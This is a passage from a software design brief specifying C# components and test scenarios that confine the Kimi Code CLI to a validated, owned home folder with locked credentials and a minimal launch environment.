   [models.\"{id}\"] block coai cannot read whole (it reads provider, model, max_context_size and a one-line capabilities
   array) — fix the block, or remove it and coai's pinned values are used")`; no table → the pinned entry; no pinned
   entry → the `ModelRefusal` sentence. `KimiModels.Curated` IS the table's ids — one source (E4.5's parity test may
   read the JSON).
7. **`KimiConfig.cs`** — `static string Render(KimiOauthSlot slot, KimiModelBlock block)` → EXACTLY, LF-separated, one
   trailing LF, no BOM (`new UTF8Encoding(false)`):
   ```
   default_model = "{block.Id}"

   [providers."managed:kimi-code"]
   type = "kimi"
   base_url = "{slot.BaseUrl}"

   [providers."managed:kimi-code".oauth]
   storage = "file"
   key = "{slot.Key}"
   oauth_host = "{slot.OauthHost}"

   [models."{block.Id}"]
   provider = "managed:kimi-code"
   model = "{block.Model}"
   max_context_size = {block.MaxContextSize}
   capabilities = [ {each capability as "x", joined by ", "} ]
   ```
   — the probe's `minimalConfigToml` with `withModels: true`, byte for byte (`research/RESULTS_kimi_confinement.md` §17
   rung 3). A value holding `"`, `\` or a control character → `Render` throws `ArgumentException` naming the key (the
   caller turns it into a refusal) — never an escape coai did not measure. `static byte[] Bytes(string text)`.
8. **`KimiHome.cs`** — the make and the SHAPE check:
   - `static string Made(HostKind host, KimiPlaces places, byte[] expectedConfig)` — before the turn (the `HomeMade`
     slot): `OwnedPaths.FirstLink(places.OwnedRoot, places.Home, places.Os)` non-empty → `{link} is a link, and an
     owned home is never reached through one`; `Directory.CreateDirectory(Home)` and `(Os)`; when `Link` AND `Config` are
     absent (a FRESH home): `Junctions.Make(host, Link, Credentials)` (its sentence returned as is, prefixed `the Kimi
     sign-in could not be linked: `), then `File.WriteAllBytes(Config, expectedConfig)`; when either exists nothing is
     written — the validation inside the turn judges it. An `IOException` → `the coai-owned Kimi home {root} could not be
     made ({message})`.
   - `static string Refusal(KimiPlaces places, byte[] expectedConfig)` — inside the turn, the FIRST problem: the root,
     `home/` or `os/` a link → refused; `os/` missing → `{root}/os is missing — the empty OS home Kimi is given`; `os/`
     holding anything → `os/ holds {name}: the empty OS home coai gives Kimi received a file`; then the walk of `home/`
     (the `VibeHome.Inside` / `Judge` shape, `Order(Ordinal)`): at `credentials` — must be a link
     (`OwnedPaths.IsLinkIfThere`) whose `Junctions.Target` `SameFolder`s `places.Credentials` (absent → `has no
     credentials junction`; a real folder → `credentials is a real folder, not the junction to {target}`; elsewhere →
     `credentials points at {read}, not at {target}`), and never descended; at `config.toml` — `File.ReadAllBytes`
     sequence-equal to `expectedConfig` (else `config.toml is not what coai writes for this person and {id} — tampered,
     or your Kimi sign-in changed since the home was made (a re-login)`); any OTHER link anywhere → `is a link, and an
     owned home is never reached through one`; `bin` (file or folder) → `holds bin/, which means Kimi downloaded ripgrep
     or fd into the home — coai refuses code in an owned home; install rg and fd ({decision 2's commands})`; the ADMITTED
     set: the folders `cache`, `logs`, `sessions`, `user-history`, `file-history`, `telemetry`, `updates` (descended;
     anything inside admitted but a link), the files `session_index.jsonl` and `workspaces.json`, and `workspace-trust`
     only as an EMPTY folder (an entry → `workspace-trust/{e} trusts a folder — an owned home trusts nothing`); EVERYTHING
     else refused by name — `holds {relative}, which is not something Kimi writes into its home` (that covers `mcp.json`,
     `tui.toml`, `skills/`, `agents/`, `AGENTS.md`, `agents.md`, `hooks*`, `plugins/`, `themes/`, `local.toml`,
     `device_id`, `region`, `migrations-effort.json`, `statusline*`, and any name nobody listed — an allowlist, as
     `VibeHome`). Every sentence ends `— coai refuses to start Kimi on it (D19 of todo/PLAN_vibe_and_kimi_runtimes.md);
     delete {root} and the next launch makes a fresh home`. Reads only; never follows a link; a read failure → refused
     rather than started on a home nobody checked.
   - `static string HomeFor(string scratch, string provider, string role)` → `scratch/kh-<10 hex>` with `VibeRuntime.Short`
     made `internal` and called (one hash rule, two prefixes).
9. **`KimiCredentialsLock.cs`** — `public static string Root { get; }` (decision 1) — the product's default; **for
   tests an `AsyncLocal` override, never a set-and-restore of the static** (review B2 (a): the suite runs eight tests at
   once, `xunit.runner.json:3`, and four classes would race one static): `internal static IDisposable RootFor(string
   folder)` sets an `AsyncLocal<string?>` the way `GitScratch.AfterUnlink` is per async flow, and `Root` reads the
   override first. **The key** (decision 9): `static string KeyFor(string target)` → `final =
   HandleRead.FinalDirectory(target)` (§16); empty → empty (no key); else SHA-256 of `final.ToUpperInvariant()` (UTF-8),
   lower hex `[..16]`. `static string PathFor(string target)` → `Root/<key>.lock`, and `static string
   TreePathFor(string target)` → `Root/<key>.tree.lock` — both EMPTY when there is no key (a caller that gets an empty
   path refuses; it never hashes the spelling instead). `internal static Func<string, string> Final` seam (test only;
   the product's is `HandleRead.FinalDirectory`) — and the seam is not the only way to the no-key branch: a folder that
   does not exist has no handle to name, so `KeyFor` of a missing folder is empty in production too (S2.42's seam-free
   row). **The gate** (the server's): `static async Task<Hold> TakeAsync(string target, CancellationToken ct)`: no key →
   `Unusable(new IOException("cannot be named by its handle"))` at once, no file made under `Root`;
   `Directory.CreateDirectory(Root)`; loop `await Task.Run(() => HeldFile.TakeWithin(PathFor(target), Slice), ct)` →
   `Taken` returned, `Unusable` returned at once, `Busy` loops; `Slice = TimeSpan.FromSeconds(1)`. `KimiLaunch` turns
   `Unusable` into `the Kimi sign-in lock {path} cannot be taken ({cause}) — fix the folder's permissions`, and the
   no-key cause into decision 9's sentence. **The tree hold** (the shim's, decision 10): `public sealed record
   TreeHold(FileStream SignIn, FileStream Home) : IDisposable` (both disposed, once); `static Hold HoldTree(string
   target, string root, TimeSpan within)` — `HeldFile.TakeWithin(TreePathFor(target), within, inheritable: true)` (§15),
   then `HeldFile.Take(Path.Combine(root, HomeHoldName), inheritable: true)` with `HomeHoldName = "coai-tree.lock"`
   (the per-HOME file of decision 11; a `Busy` there is a bug — nothing else ever takes it — answered as `Unusable`);
   the first stream released when the second fails; synchronous on purpose — the shim calls it in `AskAcpMode.TurnAsync`
   immediately before `AcpClient.AskAsync` (synchronous up to `AcpTransport.Start`, `AcpClient.cs:46`) and must not
   yield between the take and the start; `Busy` after `within` is the shim's 69 with decision 10's sentence; `Unusable`
   its 65. The shim's `target` is `Junctions.Target(<root>/home/credentials)` — the link's own reparse data, no
   environment, no profile (decision 4) — its `root` is `--home`, and its `Root` is the `--locks` flag; without
   `--locks` a Kimi profile is refused 65 and a fake profile takes no hold. `static LockProbe HomeProbe(string root)` →
   `HeldFile.Probe(root/coai-tree.lock)` — what `KimiHome.Dispose` asks (§14); no `TreeProbe(target)` exists (M2: a
   disposal never re-keys). *[E4.3: `AskAcpMode.TurnAsync` calls `HoldTree(target, root, what is left of the deadline)`
   right before `AskAsync` and disposes it after `AskAsync` returns (`EndAsync` has awaited `Exited` by then); S3.14–S3.17;
   `--locks` joins the pinned flags of decision 4. E4.4: `KimiRuntime` passes `--locks KimiCredentialsLock.Root` on
   the shim's request.]*
10. **`KimiLaunch.cs`** — constants `HomeVariable = "KIMI_CODE_HOME"`, `NoUpdateVariable = "KIMI_CODE_NO_AUTO_UPDATE"`,
    `NoUpdateOn = "1"`, `HomeFlag = "--home"`, `PersonsBinFlag = "--persons-bin"`, `ModelFlag = "--model"`,
    `VersionTimeout = 60 s`:
    - `static string HostRefusal(HostKind host, string executable)` — `VibeLaunch`'s two sentences with `Kimi` for
      `Vibe` and D18 cited, through `HostKinds.RunsInWsl` (decision 7).
    - `static ProcessRequest Built(ProcessRequest request, KimiPlaces places)` → `request with { InheritsEnvironment =
      false, Passthrough = ProcessEnvironment.Minimal, Environment = { KIMI_CODE_HOME = places.Home,
      KIMI_CODE_NO_AUTO_UPDATE = "1", USERPROFILE = places.Os, HOME = places.Os, HOMEDRIVE = Path.GetPathRoot(Os) without
      its trailing separator (`C:`), HOMEPATH = Os without that root (`\Users\…\os`), PATH = BuiltPath([places.PersonsBin,
      ..places.ToolFolders], the request's own PATH when it carries one, else this process's PATH) } }`. `static string
      BuiltPath(IReadOnlyList<string> prefix, string? parent)` — pure, idempotent: the prefix, then each entry of `parent`
      (split on `Path.PathSeparator`, empties dropped) not already present (`OrdinalIgnoreCase` on Windows, trailing
      separators trimmed). A non-Windows host is refused by `HostRefusal` first; `Built` still writes all seven names so
      the shape is one (D19: `HOME` alone when D18 lifts — a later change).
    - `static string EnvironmentRefusal(ProcessRequest request, KimiPlaces places)` — the FIRST of: inherits, or
      `Passthrough` not set-equal to `Minimal`, or `Environment.Count != 7`, or a name outside the seven (compared with
      `ProcessEnvironment.NameComparer`) → `this Kimi launch was not built with coai's own environment (the minimal set
      plus KIMI_CODE_HOME, KIMI_CODE_NO_AUTO_UPDATE=1, the four OS-home names pointing into coai's own os/ folder, and a
      PATH beginning with your ~/.kimi-code/bin, nothing inherited) and is refused (D19)`; `KIMI_CODE_HOME != places.Home`;
      any of `USERPROFILE`, `HOME`, `HOMEDRIVE + HOMEPATH` not `places.Os`; the pin not `1`; `PATH`'s first entry not
      `places.PersonsBin`; and WHEN the argv carries them, `--home` not `places.OwnedRoot` or `--persons-bin` not
      `places.PersonsBin` (the shim's request carries both; `--version` carries neither) — each its own sentence naming
      the value found. `static string FlagOf(ProcessRequest request, string flag)` — the value after `flag` in
      `Arguments`, empty when absent; `ModelOf(request) => FlagOf(request, ModelFlag)`.
    - `static async Task<LaunchTurn> TakeAsync(HostKind host, ProcessRequest request, KimiPlaces places,
      IProcessLauncher launcher, CancellationToken ct)` — **before the turn, in this order** (`FirstOf`):
      `HostRefusal(host, places.Executable)`; `places.ToolsRefusal`; `ModelRefusal(ModelOf(request))`;
      `EnvironmentRefusal(request, places)`; `KimiPersonsConfig.ReadFile(places.PersonsConfig)` → its refusal;
      `!Directory.Exists(places.Credentials)` → `not signed in to Kimi Code — {home} has no credentials folder; run
      `kimi login` in a terminal and try again` (the §10 sentence, earlier and cheaper); `KimiModelBlocks.For(…)` → its
      refusal; `expected = KimiConfig.Bytes(Render(slot, block))` (an `ArgumentException` → its refusal);
      `KimiHome.Made(host, places, expected)` (E4.1's UNC / chained-link / fresh-path refusals come through it). **Then**
      `turn = await VibeHomeTurns.TakeAsync(places.OwnedRoot, ct)`; `held = await KimiCredentialsLock.TakeAsync(places.Credentials,
      ct)` (a throw or an `Unusable` gives the turn back first). **Inside both:** `KimiHome.Refusal(places, expected)` →
      `VersionAsync` (`launcher.RunAsync(Built(new ProcessRequest(places.Executable, ["--version"], places.Home) { Timeout
      = VersionTimeout }, places), ct)`; exit 0 and a `VersionWarnings.VersionIn` match, else `` `{exe} --version` answered
      no version (exit {n}): {one line} ``; `Win32Exception` → `'{exe}' could not be started: {message} —
      {VendorDiagnosis.InstallCure("kimi") ?? "install Kimi Code: https://www.kimi.com/code/docs/en/kimi-code-cli/guides/getting-started"}`)
      → `KimiHome.Refusal` AGAIN → `LaunchTurn.Holding(new Attempt(turn, held.Stream), warning:
      KimiAcpProfile.MeasuredVersions.Contains(v) ? "" : VersionWarnings.Unmeasured("Kimi", v, …), cliVersion: "kimi " + v)`.
      A refusal after the turn: `Given` — the lock's stream disposed, then the turn. `Attempt.Dispose`: the stream, then
      the turn, once.
    - `static string VersionWarning(string printed)` — for E4.4's card: `VersionIn` → in `MeasuredVersions` → empty, else
      the Kimi sentence.
11. **`KimiAcpProfile.MeasuredVersions`** — `public static IReadOnlyList<string> MeasuredVersions { get; } = ["2.1.1"]`,
    with the remark: every number in the RESULTS is 2.1.1's; a version joins when the whole probe has run on it.
12. **`VersionWarnings.cs`** (`src_mcp/runners/Reviewers/`) — `Unmeasured(runtime, running, measured, numbersCover,
    advised)` = `$"{runtime} {running} is not a version coai has measured (it measured {measured}); it is run anyway, but
    {numbersCover} — {advised}"`; `VersionIn(printed)` (the regex from `VibeLaunch.cs:73`, moved; `VibeLaunch.VersionIn`
    delegates). `VibeLaunch.Unmeasured` becomes `VersionWarnings.Unmeasured("Vibe", version, manifest.Known, $"its
    confinement (research/RESULTS_vibe_confinement.md) and its home's plugin hashes are {manifest.Known}'s, and this
    version's plugin files are admitted by name only", "re-run `node scripts/vibe-home-manifest.mjs --write` and `node
    scripts/probe-vibe-confinement.mjs` with this Vibe to measure it")` — byte-identical to today's output.
13. **Docs**: `research/module_runners.md` — a *Kimi* unit beside the Vibe one (the places resolved once, the tools
    rule, the config render and its readers, the validation list, the environment, the gate and the tree hold — their
    keys, who takes which, their order, and what survives a crash (decisions 9–10) — the disposal's tree probe, the
    shared warning builder, the junction-first disposal); `shared/kimi-model-blocks.json` documented where the Vibe
    manifest is (the csproj comment and the module doc); `research/module_tests.md` rows for the classes below; the
    parent plan's §4 S4 block records deviations 9–12 when the story lands (its text stays the plan's until then). E4.3
    and E4.4 read the seam from decision 4 (the bracketed notes in their sections).
14. **`KimiHome.Dispose` — D19's order, explicit, for every caller that knows it holds a Kimi home** (the plan round on
    #817, accepted 2026-10-14: belt and braces over E4.1's in-deleter check). `public abstract record Disposal {
    Clean(bool LinkWasThere); Stopped(string Reason) }` (closed). `static Disposal Dispose(string root, Action<string>
    warn)`, in this order and no other: (1) `link = root/home/credentials`; when `OwnedPaths.IsLinkIfThere(link)`:
    `target = Junctions.Target(link)` (read from the link's OWN reparse data, never by walking into it); **then (added
    2026-10-15, decision 11; per HOME since the review of f1983923): `KimiCredentialsLock.HomeProbe(root)` →
    `Held` or `Unknown` → `Stopped("a Kimi started on {root} is still running (its tree hold {path} is held) — the home
    is kept until it ends")` with NOTHING unlinked and nothing outside coai's tree opened; `Free` → on;** `before` = the
    target's direct entry names and their count (empty and unverified when the target cannot be listed);
    `Directory.Delete(link, recursive: false)`; `IsLinkIfThere(link) || Directory.Exists(link)` after → `Stopped("{link}
    still exists after its unlink — nothing was deleted")`; `after` read the same way; a name of `before` absent from
    `after`, or a count below `before`'s → `Stopped("the folder {target} lost {names} during the unlink of {link} —
    nothing more was deleted; check it before deleting {root} again")`; (2) when `link` is a REAL folder or absent:
    nothing to unlink or verify (E4.1 decision 3); (3) only then `GitScratch.DeleteEvenIfReadOnly(root)` — whose own
    check (E4.1 brief §2) is the second belt and meets no link at `credentials` any more; a `LinkTargetLostException`
    from a link elsewhere in the tree → `Stopped(its message)`; any other `IOException` → `warn` and `Stopped`. A
    `Stopped` deletes nothing more and is LOGGED by every caller. An `internal static Action<string>? AfterUnlink` seam
    (test only) runs between (1)'s unlink and its second read. `static int DisposeAllUnder(string folder, Action<string>
    warn)` — `Dispose` on the folder itself when `folder/home` exists (S5's conversation root), then on every direct
    child whose name begins `KimiHome.Prefix` (`kh-`); answers how many were `Clean`; a `Stopped` is warned and the walk
    goes on. **Callers:** D20's `ConsultantHomeSweep.Pass.Removed` — under its locks, before `DeleteAllBut` (`:175`),
    `KimiHome.DisposeAllUnder(folder, warn)`, and a `Stopped` → `warn` and `return false` (the folder is kept this beat;
    `close_consult`'s `RemoveNow` goes through the same `Removed`) — wired in THIS story with S2.39; the round's scratch —
    `RoundScratch.Delete` calls `KimiHome.DisposeAllUnder(Directory, _note)` before its deleter — wired by E4.4 (its
    bracketed note and S4.15), the primitive and its tests are this story's; the question row's `finally` and the
    consultant check — S5's. `KimiRuntime`'s own probe home holds no junction and stays on the bare deleter.
15. **`HeldFile.Take` widened, not copied** (decision 10; `HeldFile.cs:41-55`, `:87-100`): `Take(string path, bool
    inheritable = false)` and `TakeWithin(string path, TimeSpan within, bool inheritable = false)` — the share mode is
    `FileShare.None | (inheritable ? FileShare.Inheritable : 0)`; `FileShare.Inheritable` is not a share mode but the
    `bInheritHandle` of the handle's security attributes, so the open stays exclusive. Every existing caller keeps the
    default. The remarks gain a paragraph: *an inheritable hold is held by every process that inherits the handle until
    the last of them is gone — the property the Kimi tree hold wants (decision 10 of E4.2), and the reason it is never
    the default: .NET's non-shell `Process.Start` passes `bInheritHandles = TRUE` and no handle list, so EVERY child
    started while the hold is open inherits it, redirected or not — which is also why no TEST ever holds one in the
    test host (S2.43 holds it in a child).*
16. **`HandleRead.FinalDirectory`, new and `internal`; `CanonicalDirectory` stays private and falls back as today**
    (decision 9, review B1; `HandleRead.cs:211-224`): `internal static string FinalDirectory(string root)` — on Windows
    the `CreateFileW(FILE_FLAG_BACKUP_SEMANTICS)` open and `WindowsFinalPath` of today's `:220-221`, answering EMPTY when
    the open is invalid or the call answers 0 or over the buffer; on every other host EMPTY (no `Real`, no `realpath`
    — D18 never reaches it, and a non-Windows key would be a spelling key). `CanonicalDirectory(root)` becomes
    `FinalDirectory(root) is { Length: > 0 } final ? final : WorktreePaths.Real(root)` — byte-identical behaviour for
    `Trust`, whose readers WANT the fallback. Called by `KimiCredentialsLock.KeyFor` and `Junctions.Resolved` — never a
    second `GetFinalPathNameByHandleW` import. Its remark gains: *also the identity a Kimi sign-in's lock is keyed by,
    and what the junction maker asks to see where a target really is — and for those two an unnamed handle is EMPTY,
    never the spelling (E4.2 decisions 9 and 13).*
17. **`Junctions.Refusal` gains `Resolved`** (decision 13), after `Chained` and before `Taken`, with the `final` seam
    alongside `driveType` (`internal static string Refusal(host, link, target, driveType, final)`; the public overload
    passes `HandleRead.FinalDirectory`): empty → the "cannot be named by its handle" sentence; `!IsLocalDrivePath(final,
    driveType)` → the "resolves to {final}" sentence. `Make` calls the widened `Refusal`. In production the empty branch
    is reached only by a folder that exists and still cannot be opened or named — `Missing` has already refused an absent
    one — so S2.46's third row goes through the seam and says so; the seam-free proof of the no-key branch is S2.42's.
    The remarks gain: *an ancestor of the target may be a link (a relocated profile is one); the target itself may not,
    and where the ancestors lead must still be a local drive.* S1.3's chained row stays red as it is; CC of `Refusal`
    unchanged (one more lambda in the array).

**SCENARIOS.** Every fake person's home is a folder INSIDE the test's own `TempDir.For("testsToDelete-kimi-…")`, holding
`config.toml` (the owner's shape: the managed provider, its OAuth slot, a `moonshot-ai` row with an `api_key`, a
`[[hooks]]` entry, a `[models."kimi-code/kimi-for-coding"]` block with `max_context_size = 1048576`),
`credentials/{kimi-code-env-x.json, kimi-code.json}` read-only, and `bin/{kimi.exe, rg.exe, fd.exe}` as empty files;
`KimiPlaces.Resolve` is given an `env` function and a `fileExists` over that folder. Classes: `KimiPersonsConfigTests`,
`KimiConfigRenderTests`, `KimiModelBlocksTests`, `CodexConfigFileTests` (extended), `KimiToolsTests`, `KimiPlacesTests`,
`KimiHomeTests`, `KimiLaunchControlTests` (a `FakeKimi` launcher in the `FakeVibe` shape), `KimiCredentialsLockTests`,
`VersionWarningsTests`, `KimiCanaryTests` (S2.45). Red first; a missing class is a COMPILE red — stub, then watch the
behavioural red named here. No test here holds a lock, a junction or a canary anywhere but under its own
`testsToDelete-` folders (`KimiCredentialsLock.Root` is pointed at one for the test's duration and restored in `finally`).

| # | Given | When | Then | Expected red today |
|---|---|---|---|---|
| S2.1 `TheSlot_IsReadFromThePersonsConfig_AndNothingElseLeavesIt` | the owner-shaped config | `KimiPersonsConfig.Read` | `Found`: type `kimi`, the base_url, storage `file`, the key, the oauth_host — the managed tables' values; the record's fields hold no `api_key` and no hook command | stub: `Refused` |
| S2.2 `NoManagedProvider_NoOauth_OrAnEmptyKey_IsNotSignedIn` (Theory: no file; no provider table; no `.oauth`; `key = ""`) | — | `ReadFile` / `Read` | the not-signed-in sentence naming `kimi login` | — |
| S2.3 `AKeyringStorage_OrAnotherType_IsRefusedAsUnmeasured` (Theory: `storage = "keyring"`; `type = "openai"`) | — | `Read` | the two sentences | `Found` |
| S2.4 `TableValue_ReadsInsideOneNamedTableOnly` (`CodexConfigFileTests`, Theory) | `base_url` in `[providers."managed:kimi-code"]` AND in `[providers."moonshot-ai"]`; a quoted-dotted header `[models."kimi-code/k3"]`; a key only at root; `capabilities = [ "a", "b" ]`; a multi-line array | `TableValue` / `TableStrings` / `HasTable` | the right table's value; the root key not answered for a table; `["a","b"]`; `[]` for the multi-line form; `HasTable` true / false | (new members — compile red) |
| S2.5 `TheRender_IsTheProbesBytes` | the slot `(kimi, https://api.kimi.com/coding/v1, file, oauth/kimi-code-env-x, https://auth.kimi.com)` and the pinned `k3-256k` block | `KimiConfig.Render`, `Bytes` | the literal of brief §7 (a raw string with `\n` in the test), no BOM, ends with one `\n` | stub: empty |
| S2.6 `TheRender_RefusesAQuoteOrABackslashInAValue` (Theory: `"`, `\`, `\n` in the key / base_url / model) | — | `Render` | `ArgumentException` naming the key | no throw |
| S2.7 `TheModelBlock_IsThePersonsWhenTheyHaveOne` | the owner-shaped config, id `kimi-code/kimi-for-coding` | `KimiModelBlocks.For` | `Found` with `MaxContextSize 1048576` and the person's capabilities in THEIR order; the render carries `1048576` | the pinned 262144 |
| S2.8 `TheModelBlock_IsThePinnedEntry_ForEveryCuratedId` (Theory over `Curated`) | a config with no `[models]` | `For` | `Found` with the table's values; `Source` names a RESULTS § | — |
| S2.9 `APersonsBlockOnAnotherProvider_OrUnreadable_IsRefused` (Theory: `provider = "moonshot-ai"`; multi-line `capabilities`; `max_context_size` missing) | — | `For` | the two sentences of brief §6 | the pinned entry (a silent fallback) |
| S2.10 `TheCuratedList_IsTheTablesIds_InOrder_AndDefaultIsFirst` | — | `KimiModels.Curated`, `Default`, `KimiModelBlocks.Builtin` | equal, in order; `Default == "kimi-code/k3-256k"`; `Parse` of a broken document → `Broken` with the sentence | — |
| S2.11 `AnIdOutsideKimiCode_IsRefusedWithTheBillingSentence_AndAnUncuratedOneWithTheList` (Theory: `moonshot-ai/kimi-k2.6`; `nope`; `kimi-code/k9`) | — | `KimiLaunch.ModelRefusal` | the two sentences; every curated id → empty | empty |
| S2.12 `TheToolsAreFoundInBinOrOnPath_ElseRefusedNamingTheMissingOne` (`KimiToolsTests`, Theory, pure) | both in `bin`; rg in bin + fd at `C:\tools`; rg at `C:\rg` + fd at `C:\fd`; neither; rg only; `fd.exe` found only through `PATHEXT` | `FoldersFor` / `Refusal` | `[]`; `[C:\tools]`; `[C:\rg, C:\fd]`; the sentence naming `rg and fd`; naming `fd`; found | — |
| S2.13 `ThePlaces_AreResolvedFromTheRealProfile_AndHonourKimisOwnVariables` (`KimiPlacesTests`) | env `KIMI_CODE_HOME=D:\kh`, `KIMI_INSTALL_DIR=D:\ki`, a PATH; `D:\ki\bin\kimi.exe` exists | `Resolve` | `PersonsHome D:\kh`, `Credentials D:\kh\credentials`, `PersonsBin D:\ki\bin`, `Executable D:\ki\bin\kimi.exe`; without the two variables: `<profile>\.kimi-code` and its `bin`; a `kimi` only on PATH → the absolute path it resolves to | — |
| S2.14 `ForShim_ReadsNoEnvironment` | this process's `USERPROFILE` pointed at a `testsToDelete-` `os/` for the test's duration (`Environment.SetEnvironmentVariable`, restored in `finally`) | `KimiPlaces.ForShim(root, bin)` | `Home == root\home`, `PersonsBin == bin`, `Executable` empty; nothing derived from the profile | — |
| S2.15 `AFreshHome_IsMade_WithTheJunctionTheConfigAndAnEmptyOs` (`KimiHomeTests`, Windows; elsewhere the D18 row) | the fake person's home; `places` for a `kh-x` root in the test's folder | `KimiHome.Made` | empty; `home/credentials` a link whose `Junctions.Target` is the fake `credentials/`; `home/config.toml` bytes == expected; `os/` empty; the fake person's home: the same names, bytes and attributes as before (hash the tree) | stub: nothing made |
| S2.16 `AMadeHome_Passes_AndAHomeKimiWroteDataInto_Passes` | S2.15's home; then the §18 inventory added: `cache/query-store/cluster.meta.json`, `logs/kimi-code.log`, `session_index.jsonl`, `sessions/.index-dirty/a.b`, `sessions/wd_x_y/session_z/agents/main/wire.jsonl`, `workspaces.json`, `user-history/h`, `file-history/f`, `telemetry/t`, `updates/latest.json`, an EMPTY `workspace-trust/` | `KimiHome.Refusal` | empty, both times | a stub refusing everything: the sentence |
| S2.17 `EveryForbiddenName_RefusesNamingThePath` (Theory: `mcp.json`, `tui.toml`, `skills/s/SKILL.md`, `agents/a.md`, `AGENTS.md`, `agents.md`, `hooks.toml`, `hooks/h`, `plugins/p`, `themes/t`, `local.toml`, `device_id`, `region`, `migrations-effort.json`, `statusline.json`, `workspace-trust/wd_x`, `notes.txt`, `cache/x/link` (a junction to the test's folder)) | the made home plus the row | `Refusal` | a sentence naming the row's relative path and `delete {root}`; the junction row says `is a link` | empty (nothing refuses yet) |
| S2.18 `ABinFolder_RefusesWithTheRipgrepCure` | `home/bin/rg.exe` | `Refusal` | the `bin/` sentence naming `rg and fd` and `winget` | the generic sentence |
| S2.19 `ACredentialsThatIsReal_Absent_OrElsewhere_Refuses` (Theory) | `credentials` a real folder; absent; a junction to `persons2/credentials` | `Refusal` | the three sentences of brief §8 | empty |
| S2.20 `AConfigWhoseBytesDiffer_RefusesWithTheReLoginCure` (Theory: one byte changed; a CRLF rewrite; the person's `key` changed since the home was made, so `expected` re-rendered differs) | — | `Refusal` | the sentence naming tampering or a re-login | empty |
| S2.21 `AnOsFolderThatReceivedAFile_OrIsMissing_OrAHomeThatIsALink_Refuses` (Theory: `os/.agents/AGENTS.md`; `os` deleted; `root/home` a junction to a real folder) | — | `Refusal` | each sentence | empty |
| S2.22 `TheBuiltEnvironment_IsExactlyTheSevenNames_AndPathBeginsWithBin` | a request with `Environment = { "VIBE_MCP_SERVERS": "x" }`; `places` with `ToolFolders [C:\tools]`; the parent PATH `C:\tools;C:\Windows;D:\ki\bin` | `KimiLaunch.Built` | `InheritsEnvironment false`, `Passthrough` set-equals `Minimal`, exactly the seven names, no `VIBE_MCP_SERVERS`; `KIMI_CODE_HOME == root\home`; `USERPROFILE == HOME == root\os`; `HOMEDRIVE + HOMEPATH == root\os`; `PATH == "D:\ki\bin;C:\tools;C:\Windows"`; `Built(Built(r))` equals `Built(r)` | stub: the request unchanged |
| S2.23 `EnvironmentRefusal_AdmitsOnlyWhatBuiltMakes` (Theory: inherited; `Passthrough = ProcessEnvironment.Passthrough`; an 8th name `KIMI_SHELL_PATH`; `USERPROFILE = C:\Users\real`; a `PATH` beginning with `C:\Windows`; the pin `0`; `KIMI_CODE_HOME` another root; argv `--home` ≠ the root) | — | `EnvironmentRefusal` | the D19 sentence (or the value-naming one); `Built(request)` → empty | empty |
| S2.24 `HostRefusal_IsVibesShape_ForKimi` (Theory: `Linux`, `Wsl`, `MacOs`, `Other`; Windows with `wsl.exe`; with `\\wsl$\…\kimi`) | — | `HostRefusal`; `HostKinds.RunsInWsl` | the sentences name `Kimi`, `D18` and the host's word; `VibeLaunchControlTests` stay green after the move | — |
| S2.25 `TheLaunchControl_InOrder_StartsNothingOnARefusal` (`KimiLaunchControlTests`, Theory over the refusals: a Linux host; tools missing; `--model nope`; an inherited request; a config without the slot; `credentials/` absent; `credentials` a link; a UNC `KIMI_CODE_HOME`; a block on `moonshot-ai`) | `FakeKimi` | `TakeAsync` | `Refused` with the row's sentence; `fake.Started` EMPTY; `VibeHomeTurns.Held(root)` false; `HeldFile.IsHeld(PathFor(credentials))` false | stub: `Free`, the launch starts |
| S2.26 `TheTurnHoldsTheHomeAndTheLock_UntilTheLaunchIsRead` | a valid launch | `TakeAsync` | `Refusal` empty; `Held(root)` true; `IsHeld(…)` true; after `Dispose()` both false; a second `Dispose()` harmless | — |
| S2.27 `TwoLaunchesOnOneSignIn_WaitOnEachOther_AndOnTwoSignInsDoNot` | two roots, one `credentials` target; then two targets | two `TakeAsync` in parallel | the second completes only after the first's `Dispose` (a `TaskCompletionSource` ordering, the `MostAtOnce` shape); with two targets both hold at once | both hold at once |
| S2.28 `TheLockIsOutsideTheHomesRootAndTemp_AndItsWaitIsCutByTheToken` | the default `Root`; a lock held by a `FileStream` in the test; a token cancelled after 200 ms | `PathFor`, `TakeAsync` | the path is under `coai-mcp/kimi-locks`, under no `ConsultantHomes.All` folder, not under `GetTempPath()`; `OperationCanceledException` within 2 s; a `Root` that is a FILE → `Unusable` → the refusal sentence | — |
| S2.29 `TheVersionIsAskedInTheBuiltEnvironmentOnTheOwnedHome` | `FakeKimi("2.1.1")` | `TakeAsync` | the recorded `--version` request: `Executable == places.Executable` (absolute, NOT the shim), `Arguments == ["--version"]`, cwd `root\home`, `EnvironmentRefusal` empty, `Timeout == VersionTimeout`; `CliVersion == "kimi 2.1.1"`; `Warning` empty | — |
| S2.30 `AnUnmeasuredKimi_LaunchesWithTheWarning_AndAVersionlessOneIsRefused` (Theory: `2.2.0`; exit 1; `Win32Exception`) | — | `TakeAsync` | `Holding` with `Warning` naming `2.2.0`, `2.1.1`, `probe-kimi-confinement.mjs`; "answered no version (exit 1)"; the install cure | refused / no warning |
| S2.31 `TheShapeIsCheckedAgainAfterTheVersion_AndAThrowGivesEverythingBack` | `WhileTheVersionIsAsked` drops `mcp.json` into the home; a second arm throws `IOException` from the seam | `TakeAsync` | refused naming `mcp.json`, `Held(root)` false, the lock free; the throw propagates and both are free | the launch starts |
| S2.32 `VersionWarnings_OneBuilderForBoth` | — | `Unmeasured("Vibe", "2.27.0", "2.26.1", …)` and `("Kimi", "2.2.0", "2.1.1", …)` | Vibe's equals the literal `VibeLaunch` produced before this story (pinned as a string in the test); both begin `<runtime> <running> is not a version coai has measured (it measured <m>); it is run anyway, but `; `VersionIn("kimi 2.2.0\n")`, `("2.1.1")`, `("python.exe …\vibe 2.26.1\r\n")` | — |
| S2.33 `MeasuredVersions_IsTwoOneOne` | — | `KimiAcpProfile.MeasuredVersions`; `KimiLaunch.VersionWarning("kimi 2.1.1")`, `("kimi 2.2.0")` | `["2.1.1"]`; empty; the sentence | — |
| S2.34 `AfterALaunch_TheHomeGoes_AndThePersonsFolderIsWhole` | S2.26's root disposed through `GitScratch.DeleteEvenIfReadOnly(root)` | — | gone; the fake `credentials/` keeps both files, bytes and `ReadOnly` | (green after E4.1) |
| S2.35 `NothingOfThePersons_IsEverWritten` | the fake person's home hashed (every file: bytes + attributes) | `Resolve` → `Made` → `Refusal` → `TakeAsync` → `Dispose` → the root deleted | the hash equal (M-K11 (b)'s rule on a fake home — the parent's §9) | — |
